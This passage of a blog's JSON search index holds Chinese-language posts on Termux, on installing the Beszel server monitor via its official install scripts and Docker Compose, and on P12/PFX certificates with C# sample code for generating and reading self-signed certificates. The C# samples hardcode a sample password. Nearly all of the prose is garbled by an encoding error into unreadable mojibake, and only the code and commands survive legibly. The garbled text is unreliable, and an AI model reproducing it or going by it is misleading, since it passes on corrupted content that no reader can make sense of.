TermuxTermuxä¸ä»…ä»…æ˜¯ä¸€ä¸ªSSHå®¢æˆ·ç«¯ï¼Œå®ƒæ›´åƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„Linuxç¯å¢ƒæ¨¡æ‹Ÿå™¨ã€‚ç”¨æˆ·å¯ä»¥åœ¨Termuxä¸­å®‰è£…å„ç§è½¯ä»¶åŒ…ï¼Œä½¿å…¶åŠŸèƒ½å¾—åˆ°æ— é™æ‰©å±•ã€‚å¯¹äºé‚£äº›ç†Ÿæ‚‰Linuxç³»ç»Ÿçš„ç”¨æˆ·æ¥è¯´ï¼ŒTermuxæ˜¯ä¸€ä¸ªæå…·å¸å¼•åŠ›çš„é€‰æ‹©ã€‚ ä¸°å¯Œçš„è½¯ä»¶åŒ…æ”¯æŒï¼Œå¯æ‹“å±•æ€§å¼ºï¼› å®Œæ•´çš„Linuxç¯å¢ƒï¼Œé€‚åˆé«˜çº§ç”¨æˆ·ï¼› å¯ä»¥é€šè¿‡APTåŒ…ç®¡ç†å™¨å®‰è£…å’Œæ›´æ–°è½¯ä»¶ã€‚ Termuxè¿˜å¯ä»¥å®‰è£…debianhttps://blog.csdn.net/2301_81229576/article/details/145148000","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"Beszel Lightweight Monitor","slug":"Beszel-Lightweight-Monitor","date":"2025-03-15T18:32:30.000Z","updated":"2025-03-15T18:46:03.093Z","comments":true,"path":"2025/03/16/Beszel-Lightweight-Monitor/","permalink":"https://banjinmei.github.io/2025/03/16/Beszel-Lightweight-Monitor/","excerpt":"","text":"Beszelä¸ºä½•é€‰æ‹©Beszelï¼ŸBeszel å‡­å€Ÿè½»é‡ã€æ˜“ç”¨ã€åŠŸèƒ½å…¨é¢çš„ç‰¹æ€§ï¼Œæˆä¸ºå¼€æºç›‘æ§é¢†åŸŸçš„ä¸€åŒ¹é»‘é©¬ã€‚æ— è®ºæ˜¯ä¸ªäººç”¨æˆ·è¿˜æ˜¯æŠ€æœ¯å›¢é˜Ÿï¼Œå‡å¯é€šè¿‡å…¶å¿«é€Ÿæ­å»ºé«˜æ•ˆçš„ç›‘æ§ä½“ç³»ã€‚é¡¹ç›®åœ°å€:https://github.com/henrygd/beszel Beszelå®˜ç½‘ï¼šhttps://beszel.dev/ åœ¨ä¸¤ä¸ªæœåŠ¡å™¨ä¸Šéƒ¨ç½² Beszel çš„æ­¥éª¤ã€‚ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡å·¥ä½œç®¡ç†å‘˜çš„æƒé™ ç¬¬äºŒæ­¥ï¼šä¸‹è½½å®‰è£…è„šæœ¬ï¼ˆä¸¤ä¸ªæœåŠ¡å™¨éƒ½è¦åšï¼‰å¯¹äº Hubï¼ˆç®¡ç†ä¸­å¿ƒï¼‰ 1curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-hub.sh -o install-hub.sh &amp;&amp; chmod +x install-hub.sh å¯¹äº Agentï¼ˆç›‘æ§å°å¸®æ‰‹ï¼‰ 1curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh &amp;&amp; chmod +x install-agent.sh ç¬¬ä¸‰æ­¥ï¼šè¿è¡Œå®‰è£…è„šæœ¬ï¼ˆä¸¤ä¸ªæœåŠ¡å™¨åˆ†åˆ«åšï¼‰ å®‰è£… Hubåœ¨æ”¾ Hub çš„æœåŠ¡å™¨çš„å‘½ä»¤è¡Œé‡Œï¼Œè¾“å…¥ï¼š 1./install-hub.sh å®‰è£… Agentåœ¨æ”¾ Agent çš„æœåŠ¡å™¨çš„å‘½ä»¤è¡Œé‡Œï¼Œè¾“å…¥ï¼š 1./install-agent.sh ç¬¬å››æ­¥ï¼šæ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸæ£€æŸ¥ Hubåœ¨å®‰è£… Hub çš„æœåŠ¡å™¨ä¸Šï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤æ¥çœ‹çœ‹ Hub æ˜¯ä¸æ˜¯åœ¨æ­£å¸¸å·¥ä½œï¼š 1systemctl status beszel-hub.service æ£€æŸ¥ Agent 1systemctl status beszel-agent.service åŒä¸ªæœåŠ¡å™¨12curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh &amp;&amp; chmod +x install-agent.sh./install-agent.sh docker éƒ¨ç½²æœåŠ¡ç«¯ï¼ˆHubï¼‰éƒ¨ç½²Docker Compose ï¼š 1234567services: beszel: image: &#x27;henrygd/beszel&#x27; ports: - &#x27;8090:8090&#x27; volumes: - ./beszel_data:/beszel_data è¿è¡Œåè®¿é—® http://IP:8090 åˆå§‹åŒ–ç®¡ç†å‘˜è´¦æˆ·ã€‚ å®¢æˆ·ç«¯ï¼ˆAgentï¼‰éƒ¨ç½²123456789services: beszel-agent: image: &#x27;henrygd/beszel-agent&#x27; network_mode: host volumes: - /var/run/docker.sock:/var/run/docker.sock:ro environment: PORT: 45876 KEY: &#x27;ä»Hubè·å–çš„å…¬é’¥&#x27; éƒ¨ç½²å®Œæˆåï¼Œåœ¨ Hub ç•Œé¢æ·»åŠ å®¢æˆ·ç«¯ IP åŠå¯†é’¥å³å¯å®Œæˆç»‘å®šã€‚3. å¸¸è§é—®é¢˜æƒé™é—®é¢˜ï¼šéƒ¨åˆ† NAS ç³»ç»Ÿï¼ˆå¦‚ç¾¤æ™– DSMï¼‰éœ€ç¡®ä¿ Agent å®¹å™¨æ‹¥æœ‰ root æƒé™ã€‚é˜²ç«å¢™é…ç½®ï¼šè‹¥ Hub ä¸ Agent è·¨ä¸»æœºéƒ¨ç½²ï¼Œéœ€å¼€æ”¾ç«¯å£ 45876ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":"p12 certificates","slug":"p12-certificates","date":"2025-02-19T13:56:20.000Z","updated":"2025-02-19T14:00:19.449Z","comments":true,"path":"2025/02/19/p12-certificates/","permalink":"https://banjinmei.github.io/2025/02/19/p12-certificates/","excerpt":"","text":"P12 è¯ä¹¦P12 è¯ä¹¦ï¼Œä¹Ÿç§°ä¸º PFX è¯ä¹¦ï¼ˆåœ¨ Windows ç³»ç»Ÿä¸­å¸¸ç”¨ PFX æ‰©å±•åï¼Œè€Œåœ¨å…¶ä»–ä¸€äº›ç³»ç»Ÿä¸­å¸¸ç”¨ P12 æ‰©å±•åï¼‰ï¼Œå…¶å…¨ç§°ä¸º Personal Information Exchangeã€‚å®ƒæ˜¯ä¸€ç§ç”¨äºå­˜å‚¨ä¸ªäººèº«ä»½ä¿¡æ¯å’ŒåŠ å¯†å¯†é’¥çš„æ–‡ä»¶æ ¼å¼ï¼Œé€šå¸¸é‡‡ç”¨ PKCS #12 æ ‡å‡†ã€‚P12 è¯ä¹¦æ–‡ä»¶åŒ…å«äº†å…¬é’¥ã€ç§é’¥ä»¥åŠè¯ä¹¦é“¾ï¼Œèƒ½å¤Ÿä¿è¯æ•°æ®åœ¨ä¼ è¾“å’Œå­˜å‚¨è¿‡ç¨‹ä¸­çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ï¼Œå¹¿æ³›åº”ç”¨äº SSL&#x2F;TLS åŠ å¯†ã€ä»£ç ç­¾åã€æ•°å­—èº«ä»½éªŒè¯ç­‰åœºæ™¯ã€‚ P12 è¯ä¹¦çš„ç‰¹ç‚¹ç»¼åˆæ€§ï¼šåŒæ—¶åŒ…å«äº†å…¬é’¥ã€ç§é’¥å’Œè¯ä¹¦é“¾ï¼Œæ–¹ä¾¿åœ¨ä¸åŒç³»ç»Ÿå’Œåº”ç”¨ä¸­è¿›è¡Œéƒ¨ç½²å’Œä½¿ç”¨ã€‚åŠ å¯†æ€§ï¼šä½¿ç”¨å¯†ç å¯¹ç§é’¥è¿›è¡ŒåŠ å¯†ä¿æŠ¤ï¼Œåªæœ‰çŸ¥é“å¯†ç çš„ç”¨æˆ·æ‰èƒ½è®¿é—®ç§é’¥ï¼Œæé«˜äº†ç§é’¥çš„å®‰å…¨æ€§ã€‚è·¨å¹³å°æ€§ï¼šå¯ä»¥åœ¨å¤šç§æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ï¼Œå¦‚ Windowsã€Linuxã€macOS ç­‰ã€‚ åœ¨ C# ä¸­å¤„ç† P12 è¯ä¹¦3.1 ç”Ÿæˆ P12 è¯ä¹¦ä»¥ä¸‹æ˜¯ä¸€ä¸ªåœ¨ C# ä¸­ç”Ÿæˆ P12 è¯ä¹¦çš„ç¤ºä¾‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445using System;using System.IO;using System.Security.Cryptography;using System.Security.Cryptography.X509Certificates;class Program&#123; static void Main() &#123; // ç”ŸæˆRSAå¯†é’¥å¯¹ using (RSA rsa = RSA.Create(2048)) &#123; // åˆ›å»ºè¯ä¹¦è¯·æ±‚ var certificateRequest = new CertificateRequest( &quot;CN=MySelfSignedCertificate&quot;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); // è®¾ç½®è¯ä¹¦æ‰©å±• certificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); // ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ var certificate = certificateRequest.CreateSelfSigned( DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)); // ä¿å­˜ä¸ºP12æ–‡ä»¶ string p12FilePath = &quot;MyCertificate.p12&quot;; string p12Password = &quot;MyPassword123&quot;; byte[] p12Bytes = certificate.Export(X509ContentType.Pfx, p12Password); File.WriteAllBytes(p12FilePath, p12Bytes); Console.WriteLine($&quot;P12æ–‡ä»¶å·²ç”Ÿæˆ: &#123;p12FilePath&#125;&quot;); &#125; &#125;&#125; 3.2 è¯»å– P12 è¯ä¹¦ä»¥ä¸‹æ˜¯ä¸€ä¸ªåœ¨ C# ä¸­è¯»å– P12 è¯ä¹¦çš„ç¤ºä¾‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142using System;using System.Security.Cryptography.X509Certificates;class Program&#123; static void Main() &#123; try &#123; // P12è¯ä¹¦æ–‡ä»¶çš„è·¯å¾„ string p12FilePath = &quot;MyCertificate.p12&quot;; // P12è¯ä¹¦æ–‡ä»¶çš„å¯†ç  string p12Password = &quot;MyPassword123&quot;; // è¯»å–P12è¯ä¹¦æ–‡ä»¶ using (X509Certificate2 certificate = new X509Certificate2(p12FilePath, p12Password)) &#123; // è¾“å‡ºè¯ä¹¦çš„åŸºæœ¬ä¿¡æ¯ Console.WriteLine(&quot;è¯ä¹¦ä¿¡æ¯ï¼š&quot;); Console.WriteLine($&quot;ä¸»é¢˜: &#123;certificate.Subject&#125;&quot;); Console.WriteLine($&quot;é¢å‘è€…: &#123;certificate.Issuer&#125;&quot;); Console.WriteLine($&quot;æœ‰æ•ˆæœŸå¼€å§‹æ—¶é—´: &#123;certificate.NotBefore&#125;&quot;); Console.WriteLine($&quot;æœ‰æ•ˆæœŸç»“æŸæ—¶é—´: &#123;certificate.NotAfter&#125;&quot;); Console.WriteLine($&quot;æŒ‡çº¹: &#123;certificate.Thumbprint&#125;&quot;); // æ£€æŸ¥è¯ä¹¦æ˜¯å¦åŒ…å«ç§é’¥ if (certificate.HasPrivateKey) &#123; Console.WriteLine(&quot;è¯ä¹¦åŒ…å«ç§é’¥ã€‚&quot;); &#125; else &#123; Console.WriteLine(&quot;è¯ä¹¦ä¸åŒ…å«ç§é’¥ã€‚&quot;); &#125; &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;è¯»å–è¯ä¹¦æ—¶å‡ºé”™: &#123;ex.Message&#125;&quot;); &#125; &#125;&#125; P12 è¯ä¹¦çš„ä½¿ç”¨åœºæ™¯SSL&#x2F;TLS åŠ å¯†ï¼šåœ¨ Web æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹å®‰å…¨çš„é€šä¿¡é€šé“ï¼Œç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„ä¿å¯†æ€§å’Œå®Œæ•´æ€§ã€‚ä»£ç ç­¾åï¼šç”¨äºå¯¹è½¯ä»¶ä»£ç è¿›è¡Œæ•°å­—ç­¾åï¼Œä¿è¯ä»£ç çš„æ¥æºå’Œå®Œæ•´æ€§ï¼Œé˜²æ­¢ä»£ç è¢«ç¯¡æ”¹ã€‚æ•°å­—èº«ä»½éªŒè¯ï¼šåœ¨ä¼ä¸šå†…éƒ¨æˆ–å…¶ä»–å®‰å…¨ç³»ç»Ÿä¸­ï¼Œç”¨äºéªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œç¡®ä¿åªæœ‰åˆæ³•ç”¨æˆ·æ‰èƒ½è®¿é—®ç³»ç»Ÿèµ„æºã€‚ å¸¸è§è¯ä¹¦ç±»å‹P12ï¼ˆPFXï¼‰è¯ä¹¦ç§é’¥ä¿æŠ¤ï¼šP12 è¯ä¹¦å°†å…¬é’¥ã€ç§é’¥å’Œè¯ä¹¦é“¾æ•´åˆåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå¹¶ä½¿ç”¨ç”¨æˆ·è®¾ç½®çš„å¯†ç å¯¹ç§é’¥è¿›è¡ŒåŠ å¯†ã€‚è¿™ç§æ–¹å¼æä¾›äº†è¾ƒé«˜çš„ç§é’¥ä¿æŠ¤ï¼Œå¦‚æœå¯†ç è¶³å¤Ÿå¤æ‚ï¼Œèƒ½æœ‰æ•ˆé˜²æ­¢ç§é’¥è¢«éæ³•è·å–ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªä¼ä¸šå†…éƒ¨ç³»ç»Ÿä¸­ï¼Œä½¿ç”¨ P12 è¯ä¹¦è¿›è¡Œå®¢æˆ·ç«¯èº«ä»½éªŒè¯ï¼Œåªæœ‰çŸ¥é“æ­£ç¡®å¯†ç çš„ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ç§é’¥è¿›è¡Œç­¾åæ“ä½œã€‚å®Œæ•´æ€§ï¼šç”±äºæ‰€æœ‰ç›¸å…³ä¿¡æ¯éƒ½åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä¾¿äºç®¡ç†å’Œä¼ è¾“ï¼Œå‡å°‘äº†ä¿¡æ¯ä¸¢å¤±æˆ–è¢«ç¯¡æ”¹çš„é£é™©ã€‚ä½†ä¸€æ—¦æ–‡ä»¶ä¸¢å¤±ä¸”å¯†ç æ³„éœ²ï¼Œæ”»å‡»è€…å°±å¯ä»¥è·å–ç§é’¥ï¼Œå¯¹ç³»ç»Ÿå®‰å…¨é€ æˆå¨èƒã€‚åœ¨æ•°å­—è¯ä¹¦é¢†åŸŸï¼Œé™¤äº†å‰é¢æåˆ°çš„ P12ï¼ˆPFXï¼‰è¯ä¹¦ï¼Œè¿˜æœ‰å¤šç§ä¸åŒç±»å‹çš„è¯ä¹¦ï¼Œå®ƒä»¬å„è‡ªæœ‰ä¸åŒçš„ç‰¹ç‚¹å’Œåº”ç”¨åœºæ™¯ X.509 è¯ä¹¦ç®€ä»‹ï¼šX.509 æ˜¯ä¸€ä¸ªå®šä¹‰äº†å…¬é’¥è¯ä¹¦æ ¼å¼çš„æ ‡å‡†ï¼Œå‡ ä¹æ‰€æœ‰çš„æ•°å­—è¯ä¹¦éƒ½éµå¾ª X.509 æ ‡å‡†ã€‚å®ƒæ˜¯äº’è”ç½‘ä¸Šä½¿ç”¨æœ€å¹¿æ³›çš„è¯ä¹¦æ ¼å¼ï¼ŒåŒ…å«äº†å…¬é’¥ã€æŒæœ‰è€…ä¿¡æ¯ã€é¢å‘è€…ä¿¡æ¯ã€æœ‰æ•ˆæœŸç­‰å†…å®¹ã€‚åº”ç”¨åœºæ™¯ï¼šå¹¿æ³›åº”ç”¨äº SSL&#x2F;TLS åŠ å¯†ã€ç”µå­é‚®ä»¶åŠ å¯†ã€ä»£ç ç­¾åã€èº«ä»½éªŒè¯ç­‰é¢†åŸŸã€‚ä¾‹å¦‚ï¼Œå½“è®¿é—®ä¸€ä¸ªä½¿ç”¨ HTTPS åè®®çš„ç½‘ç«™æ—¶ï¼Œæµè§ˆå™¨ä¼šéªŒè¯è¯¥ç½‘ç«™çš„ X.509 è¯ä¹¦ï¼Œä»¥ç¡®ä¿ä¸çœŸå®çš„ç½‘ç«™è¿›è¡Œé€šä¿¡ã€‚å¸¸è§æ–‡ä»¶æ ¼å¼ï¼šåŒ…æ‹¬ .cerã€.crtã€.derã€.pem ç­‰ã€‚ PEM è¯ä¹¦ç®€ä»‹ï¼šPEMï¼ˆPrivacy - Enhanced Mailï¼‰æ˜¯ä¸€ç§å¸¸è§çš„è¯ä¹¦æ–‡ä»¶æ ¼å¼ï¼Œå®ƒä½¿ç”¨ Base64 ç¼–ç å°†äºŒè¿›åˆ¶çš„è¯ä¹¦æ•°æ®è½¬æ¢ä¸º ASCII æ–‡æœ¬ï¼Œé€šå¸¸ä»¥ .pem ä¸ºæ–‡ä»¶æ‰©å±•åã€‚PEM æ–‡ä»¶å¯ä»¥åŒ…å«è¯ä¹¦ã€ç§é’¥æˆ–è¯ä¹¦é“¾ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç‰¹å®šçš„æ ‡ç­¾ï¼ˆå¦‚ â€”â€“BEGIN CERTIFICATEâ€”â€“ å’Œ â€”â€“END CERTIFICATEâ€”â€“ï¼‰æ¥åŒºåˆ†ä¸åŒçš„å†…å®¹ã€‚åº”ç”¨åœºæ™¯ï¼šå¸¸ç”¨äº Linux å’Œ Unix ç³»ç»Ÿï¼Œä»¥åŠä¸€äº›å¼€æºè½¯ä»¶å’ŒæœåŠ¡å™¨åº”ç”¨ä¸­ã€‚ä¾‹å¦‚ï¼Œåœ¨ Apache æˆ– Nginx ç­‰ Web æœåŠ¡å™¨é…ç½®ä¸­ï¼Œç»å¸¸ä½¿ç”¨ PEM æ ¼å¼çš„è¯ä¹¦æ¥å¯ç”¨ HTTPS æœåŠ¡ã€‚ç‰¹ç‚¹ï¼šæ–‡æœ¬æ ¼å¼ï¼Œæ˜“äºæŸ¥çœ‹å’Œç¼–è¾‘ï¼Œå¯è·¨å¹³å°ä½¿ç”¨ã€‚ DER è¯ä¹¦ç®€ä»‹ï¼šDERï¼ˆDistinguished Encoding Rulesï¼‰æ˜¯ä¸€ç§äºŒè¿›åˆ¶ç¼–ç æ ¼å¼ï¼Œå®ƒå°†è¯ä¹¦æ•°æ®ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜å‚¨ï¼Œé€šå¸¸ä»¥ .der ä¸ºæ–‡ä»¶æ‰©å±•åã€‚DER æ ¼å¼çš„è¯ä¹¦ä¸åŒ…å«ä»»ä½•æ–‡æœ¬æ ‡ç­¾ï¼Œå› æ­¤æ–‡ä»¶ä½“ç§¯ç›¸å¯¹è¾ƒå°ï¼Œä½†ä¸èƒ½ç›´æ¥æŸ¥çœ‹å†…å®¹ã€‚åº”ç”¨åœºæ™¯ï¼šåœ¨ Java å¹³å°å’Œä¸€äº›ç¡¬ä»¶è®¾å¤‡ä¸­ä½¿ç”¨è¾ƒä¸ºå¹¿æ³›ã€‚ä¾‹å¦‚ï¼ŒJava ä¸­çš„ KeyStore é€šå¸¸å¯ä»¥ä½¿ç”¨ DER æ ¼å¼çš„è¯ä¹¦ã€‚ç‰¹ç‚¹ï¼šäºŒè¿›åˆ¶æ ¼å¼ï¼Œé€‚åˆæœºå™¨å¤„ç†ï¼Œä¸ä¾¿äºäººå·¥é˜…è¯»ã€‚ CER è¯ä¹¦ç®€ä»‹ï¼šCER è¯ä¹¦ä¹Ÿæ˜¯ä¸€ç§ X.509 è¯ä¹¦çš„æ–‡ä»¶æ ¼å¼ï¼Œå®ƒåœ¨ Windows ç³»ç»Ÿä¸­è¾ƒä¸ºå¸¸è§ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨å…¬é’¥è¯ä¹¦ã€‚CER æ–‡ä»¶å¯ä»¥æ˜¯äºŒè¿›åˆ¶ï¼ˆDER ç¼–ç ï¼‰æˆ–æ–‡æœ¬ï¼ˆPEM ç¼–ç ï¼‰æ ¼å¼ã€‚åº”ç”¨åœºæ™¯ï¼šå¸¸ç”¨äº Windows ç³»ç»Ÿçš„åº”ç”¨ç¨‹åºï¼Œå¦‚ Internet Explorer æµè§ˆå™¨åœ¨éªŒè¯ç½‘ç«™è¯ä¹¦æ—¶ä¼šå¤„ç† CER æ ¼å¼çš„è¯ä¹¦ã€‚ç‰¹ç‚¹ï¼šåœ¨ Windows ç³»ç»Ÿä¸­æ–¹ä¾¿å¯¼å…¥å’Œä½¿ç”¨ã€‚ JKS è¯ä¹¦ç®€ä»‹ï¼šJKSï¼ˆJava KeyStoreï¼‰æ˜¯ Java å¹³å°ç‰¹æœ‰çš„è¯ä¹¦å­˜å‚¨æ ¼å¼ï¼Œå®ƒæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨ Java åº”ç”¨ç¨‹åºä½¿ç”¨çš„å¯†é’¥å’Œè¯ä¹¦ã€‚JKS æ–‡ä»¶ä½¿ç”¨å¯†ç è¿›è¡Œä¿æŠ¤ï¼ŒåŒ…å«äº†ç§é’¥ã€å…¬é’¥è¯ä¹¦å’Œä¿¡ä»»çš„è¯ä¹¦ã€‚åº”ç”¨åœºæ™¯ï¼šä¸“é—¨ç”¨äº Java åº”ç”¨ç¨‹åºï¼Œå¦‚ Java Web æœåŠ¡å™¨ï¼ˆå¦‚ Tomcatï¼‰ã€Java å®¢æˆ·ç«¯åº”ç”¨ç­‰ã€‚åœ¨ Java åº”ç”¨ä¸­ï¼Œé€šå¸¸ä½¿ç”¨ KeyStore ç±»æ¥ç®¡ç† JKS æ–‡ä»¶ã€‚ç‰¹ç‚¹ï¼šä¸ Java å¹³å°ç´§å¯†é›†æˆï¼Œæ–¹ä¾¿ Java å¼€å‘è€…ä½¿ç”¨ã€‚ PKCS #7 è¯ä¹¦ç®€ä»‹ï¼šPKCS #7ï¼ˆPublic - Key Cryptography Standards #7ï¼‰æ˜¯ä¸€ç§ç”¨äºå°è£…æ•°å­—ç­¾åå’ŒåŠ å¯†æ•°æ®çš„æ ‡å‡†ï¼ŒPKCS #7 è¯ä¹¦é€šå¸¸ä»¥ .p7b æˆ– .p7c ä¸ºæ–‡ä»¶æ‰©å±•åã€‚å®ƒå¯ä»¥åŒ…å«è¯ä¹¦é“¾ï¼Œä½†ä¸åŒ…å«ç§é’¥ï¼Œä¸»è¦ç”¨äºéªŒè¯æ•°å­—ç­¾åå’Œä¼ é€’è¯ä¹¦ä¿¡æ¯ã€‚åº”ç”¨åœºæ™¯ï¼šå¸¸ç”¨äºç”µå­é‚®ä»¶å®‰å…¨ã€è½¯ä»¶åˆ†å‘ç­‰é¢†åŸŸï¼Œç”¨äºä¼ é€’å’ŒéªŒè¯è¯ä¹¦é“¾ã€‚ä¾‹å¦‚ï¼Œåœ¨ Outlook ç­‰é‚®ä»¶å®¢æˆ·ç«¯ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ PKCS #7 æ ¼å¼çš„è¯ä¹¦æ¥éªŒè¯é‚®ä»¶çš„æ•°å­—ç­¾åã€‚ç‰¹ç‚¹ï¼šä¸»è¦ç”¨äºä¼ é€’è¯ä¹¦ä¿¡æ¯å’ŒéªŒè¯ç­¾åï¼Œä¸åŒ…å«ç§é’¥ï¼Œå®‰å…¨æ€§è¾ƒé«˜","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"p12","slug":"p12","permalink":"https://banjinmei.github.io/tags/p12/"}],"author":"mu"},{"title":"socket ssl tls","slug":"socket-ssl-tls","date":"2025-02-12T17:12:50.000Z","updated":"2025-02-19T14:05:34.950Z","comments":true,"path":"2025/02/13/socket-ssl-tls/","permalink":"https://banjinmei.github.io/2025/02/13/socket-ssl-tls/","excerpt":"","text":"C#ç”Ÿæˆè¯ä¹¦åœ¨ C# ä¸­ç”Ÿæˆ .pfx è¯ä¹¦æ–‡ä»¶ï¼Œé€šå¸¸å¯ä»¥å€ŸåŠ© System.Security.Cryptography å‘½åç©ºé—´ä¸‹çš„ç±»æ¥å®ç°ã€‚ä»¥ä¸‹ä¸ºè¯¦ç»†æ­¥éª¤å’Œç¤ºä¾‹ä»£ç ï¼š åˆ›å»ºè‡ªç­¾åè¯ä¹¦åˆ©ç”¨ RSA ç®—æ³•ç”Ÿæˆå¯†é’¥å¯¹ï¼Œå†ä½¿ç”¨ CertificateRequest ç±»åˆ›å»ºè‡ªç­¾åè¯ä¹¦è¯·æ±‚ï¼Œæœ€åç”Ÿæˆè‡ªç­¾åè¯ä¹¦ã€‚å°†è¯ä¹¦ä¿å­˜ä¸º .pfx æ–‡ä»¶ï¼šä½¿ç”¨ X509Certificate2 ç±»æŠŠç”Ÿæˆçš„è¯ä¹¦å’Œç§é’¥ä¿å­˜ä¸º .pfx æ–‡ä»¶ã€‚ 12345678910111213141516171819202122232425262728293031323334353637pusing System;using System.IO;using System.Security.Cryptography;using System.Security.Cryptography.X509Certificates;class Program&#123; static void Main() &#123; // ç”ŸæˆRSAå¯†é’¥å¯¹ using (RSA rsa = RSA.Create(2048)) &#123; // åˆ›å»ºè¯ä¹¦è¯·æ±‚ var certificateRequest = new CertificateRequest( &quot;CN=MySelfSignedCertificate&quot;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); // è®¾ç½®è¯ä¹¦æ‰©å±• certificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); // ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ var certificate = certificateRequest.CreateSelfSigned( DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)); // ä¿å­˜ä¸ºPFXæ–‡ä»¶ string pfxFilePath = &quot;MyCertificate.pfx&quot;; string pfxPassword = &quot;MyPassword123&quot;; byte[] pfxBytes = certificate.Export(X509ContentType.Pfx, pfxPassword); File.WriteAllBytes(pfxFilePath, pfxBytes); Console.WriteLine($&quot;PFXæ–‡ä»¶å·²ç”Ÿæˆ: &#123;pfxFilePath&#125;&quot;); &#125; &#125;&#125; ç”Ÿæˆ RSA å¯†é’¥å¯¹ï¼šcsharpusing (RSA rsa &#x3D; RSA.Create(2048)){ &#x2F;&#x2F; â€¦}è¿ç”¨ RSA.Create(2048) æ–¹æ³•ç”Ÿæˆä¸€ä¸ª 2048 ä½çš„ RSA å¯†é’¥å¯¹ã€‚ åˆ›å»ºè¯ä¹¦è¯·æ±‚ï¼šcsharpvar certificateRequest &#x3D; new CertificateRequest( â€œCN&#x3D;MySelfSignedCertificateâ€, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);å€ŸåŠ© CertificateRequest ç±»åˆ›å»ºä¸€ä¸ªè¯ä¹¦è¯·æ±‚ï¼ŒæŒ‡å®šè¯ä¹¦çš„ä¸»é¢˜åç§°ã€å¯†é’¥å¯¹ã€å“ˆå¸Œç®—æ³•å’Œç­¾åå¡«å……æ–¹å¼ã€‚ è®¾ç½®è¯ä¹¦æ‰©å±•ï¼šcsharpcertificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true));certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false));ä¸ºè¯ä¹¦è¯·æ±‚æ·»åŠ åŸºæœ¬çº¦æŸå’Œå¯†é’¥ä½¿ç”¨æ‰©å±•ã€‚ ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼šcsharpvar certificate &#x3D; certificateRequest.CreateSelfSigned( DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365));è°ƒç”¨ CreateSelfSigned æ–¹æ³•ç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼ŒæŒ‡å®šè¯ä¹¦çš„æœ‰æ•ˆæœŸã€‚ ä¿å­˜ä¸º .pfx æ–‡ä»¶ï¼šcsharpstring pfxFilePath &#x3D; â€œMyCertificate.pfxâ€;string pfxPassword &#x3D; â€œMyPassword123â€;byte[] pfxBytes &#x3D; certificate.Export(X509ContentType.Pfx, pfxPassword);File.WriteAllBytes(pfxFilePath, pfxBytes);ä½¿ç”¨ Export æ–¹æ³•å°†è¯ä¹¦å’Œç§é’¥å¯¼å‡ºä¸º .pfx æ ¼å¼çš„å­—èŠ‚æ•°ç»„ï¼Œå†ä½¿ç”¨ File.WriteAllBytes æ–¹æ³•å°†å­—èŠ‚æ•°ç»„ä¿å­˜ä¸ºæ–‡ä»¶ã€‚ æ³¨æ„äº‹é¡¹è¦ä¿è¯è¿è¡Œä»£ç çš„ç”¨æˆ·å¯¹ä¿å­˜ .pfx 